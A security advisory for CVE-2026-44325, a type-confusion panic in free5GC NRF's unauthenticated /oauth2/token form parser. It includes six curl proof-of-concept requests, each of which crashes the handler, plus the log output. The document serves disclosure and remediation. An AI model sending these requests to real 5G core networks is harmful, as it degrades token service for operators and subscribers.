# [H] free5GC NRF: type-confusion panic in POST /oauth2/token structured-form parser via Reflect.Set on incompatible types

## Summary
Severity: High
Advisory: GHSA-f8qv-7x5w-qr48
CVE: CVE-2026-44325
CWE: CWE-20, CWE-755, CWE-843
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-f8qv-7x5w-qr48
Type: github-advisory

## Affected
- Go: `github.com/free5gc/nrf` — affected >=0 <1.4.3

## Details
### Summary
free5GC's NRF root SBI endpoint `POST /oauth2/token` contains a parser-level type-confusion bug family. The handler in `NFs/nrf/internal/sbi/api_accesstoken.go` reflects over `models.NrfAccessTokenAccessTokenReq`, special-cases only plain `string` and `NrfNfManagementNfType` fields, and treats every other field as if it were a single `models.PlmnId`. The parsed `*models.PlmnId` is then assigned with `reflect.Value.Set()` to whichever field name the attacker put in the form body, which panics whenever the destination field's real type is incompatible (slice, different struct, primitive). Gin recovery converts each panic into `HTTP 500`, but the endpoint remains remotely panicable from a single unauthenticated form-encoded request and is repeatedly triggerable across at least 6 confirmed crashing fields.

Note: `/oauth2/token` is unauthenticated by design (it is the OAuth2 token-issuance endpoint). So this is NOT framed as an auth-bypass finding -- it is a parser bug on an intentionally unauthenticated SBI endpoint.

### Details
Validated against the NRF container in the official Docker compose lab.
- Source repo tag: `v4.2.1`
- Running Docker image: `free5gc/nrf:v4.2.1`
- Docker validation date: 2026-03-22
- NRF endpoint: `http://10.100.200.3:8000`

Root cause is in the access-token request parser:
- `NFs/nrf/internal/sbi/api_accesstoken.go:52`
- `NFs/nrf/internal/sbi/api_accesstoken.go:87`
- `NFs/nrf/internal/sbi/api_accesstoken.go:98`
- `NFs/nrf/internal/sbi/api_accesstoken.go:100`
- `NFs/nrf/internal/sbi/api_accesstoken.go:112`

The model definition lives in `free5gc/openapi`:
- `models/model_nrf_access_token_access_token_req.go:27`
- `models/model_nrf_access_token_access_token_req.go:29`
- `models/model_nrf_access_token_access_token_req.go:30`
- `models/model_nrf_access_token_access_token_req.go:31`

The parser's effective shape is: parse value as `*models.PlmnId`, then `dstField.Set(reflect.ValueOf(parsedPlmnId))`. Every destination field that is NOT `string` and NOT `NrfNfManagementNfType` falls into this branch, so any time the destination is a slice (`[]models.PlmnId`, `[]models.Snssai`, `[]models.PlmnIdNid`, `[]string`) or a different pointer type (`*models.PlmnIdNid`), the `reflect.Set` call panics with a runtime type-confusion error.

Confirmed crashing fields in this DoS family (all reachable from a single unauthenticated form-encoded POST):
- `requesterPlmnList` -> panic assigning `*models.PlmnId` to `[]models.PlmnId`
- `requesterSnssaiList` -> panic assigning `*models.PlmnId` to `[]models.Snssai`
- `requesterSnpnList` -> panic assigning `*models.PlmnId` to `[]models.PlmnIdNid`
- `targetSnpn` -> panic assigning `*models.PlmnId` to `*models.PlmnIdNid`
- `targetSnssaiList` -> panic assigning `*models.PlmnId` to `[]models.Snssai`
- `targetNsiList` -> panic assigning `*models.PlmnId` to `[]string`

### PoC
Reproduced end-to-end against the running NRF at `http://10.100.200.3:8000`. Each of the following single requests independently crashes the handler.

1. `requesterPlmnList` -> `[]models.PlmnId` mismatch:
```
curl -i -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'requesterPlmnList={"mcc":"208","mnc":"93"}'
```

2. `requesterSnssaiList` -> `[]models.Snssai` mismatch:
```
curl -i -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'requesterSnssaiList={"mcc":"208","mnc":"93"}'
```

3. `requesterSnpnList` -> `[]models.PlmnIdNid` mismatch:
```
curl -i -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'requesterSnpnList={"mcc":"208","mnc":"93"}'
```

4. `targetSnpn` -> `*models.PlmnIdNid` mismatch:
```
curl -i -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'targetSnpn={"mcc":"208","mnc":"93"}'
```

5. `targetSnssaiList` -> `[]models.Snssai` mismatch:
```
curl -i -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'targetSnssaiList={"mcc":"208","mnc":"93"}'
```

6. `targetNsiList` -> `[]string` mismatch:
```
curl -i -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'targetNsiList={"mcc":"208","mnc":"93"}'
```

Observed response (per request, no body returned):
```
HTTP/1.1 500 Internal Server Error
Content-Length: 0
```

NRF container logs (`docker logs nrf`) confirm the `reflect.Set` type-confusion panic in `HTTPAccessTokenRequest`, with the panic message changing per field type:
```
[ERRO][NRF][GIN] panic: reflect.Set: value of type *models.PlmnId is not assignable to type []models.PlmnId
[ERRO][NRF][GIN] panic: reflect.Set: value of type *models.PlmnId is not assignable to type []models.Snssai
[ERRO][NRF][GIN] panic: reflect.Set: value of type *models.PlmnId is not assignable to type []models.PlmnIdNid
[ERRO][NRF][GIN] panic: reflect.Set: value of type *models.PlmnId is not assignable to type *models.PlmnIdNid
[ERRO][NRF][GIN] panic: reflect.Set: value of type *models.PlmnId is not assignable to type []string
INFO][NRF][GIN] | 500 | POST | /oauth2/token |
```

### Impact
Type-confusion panic family (CWE-843) in the form-parser of an unauthenticated, network-reachable, root token-issuance endpoint, with no input validation on field types (CWE-20) and no defensive handling of the resulting panic before reflection (CWE-755).

This is NOT framed as an auth-bypass finding: `/oauth2/token` is unauthenticated by design. It is also NOT a process-kill DoS: Gin recovery catches each panic and the NRF process keeps running, so legitimate clients can still get tokens between attacker requests.

What the bug realistically gives an off-path attacker:
- A reliable, unauthenticated, repeatable panic primitive on the root token endpoint, reachable from a single form-encoded POST.
- Per-request CPU + log-write cost that is materially higher than a normal validation reject (`400`) would have been, because the panic generates a stack trace each time.
- A class of at least 6 attacker-selectable form keys that all crash via the same root cause, so partial fixes that harden one field do not close the family.
- Sustained-attack potential: under flood, the panic-amplification can degrade NRF token issuance (more expensive than `400` validation) and pollute logs / rotate out useful diagnostic history.

No Confidentiality impact (`HTTP 500` with empty body, no stack trace returned to the caller). No Integrity impact (panic happens before any state change). Availability impact is limited to per-request degradation under sustained attack; a single request does not deny service to other clients.

Affected: free5gc v4.2.1.

Upstream issue: https://github.com/free5gc/free5gc/issues/918
Upstream fix: https://github.com/free5gc/nrf/pull/83

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-f8qv-7x5w-qr48
- https://nvd.nist.gov/vuln/detail/CVE-2026-44325
- https://github.com/free5gc/free5gc/issues/918
- https://github.com/free5gc/nrf/pull/83
- https://github.com/free5gc/nrf/commit/f7bc77daa7425506af7569f2e61c2a210f5a0423
- https://github.com/free5gc/free5gc
